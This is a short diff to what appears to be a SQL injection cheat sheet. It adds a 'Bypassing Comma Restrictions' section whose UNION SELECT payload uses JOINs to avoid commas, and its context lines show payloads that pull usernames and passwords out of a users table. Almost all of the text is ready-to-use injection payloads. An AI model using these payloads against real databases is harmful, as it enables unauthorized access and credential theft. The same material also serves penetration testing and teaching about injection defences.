@@ -63,3 +63,7 @@ SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables)
 ` UNION SELECT username+password FROM USERS--
 
 ```
+### Bypassing Comma Restrictions
+```
+SELECT 1,2,3,4 FROM TABLE;    UNION SELECT * from ((SELECT 1 FROM TABLE)a JOIN (SELECT 2 FROM TABLE)b JOIN (SELECT 3 FROM TABLE)c JOIN (SELECT 4 FROM TABLE)d)--
+```
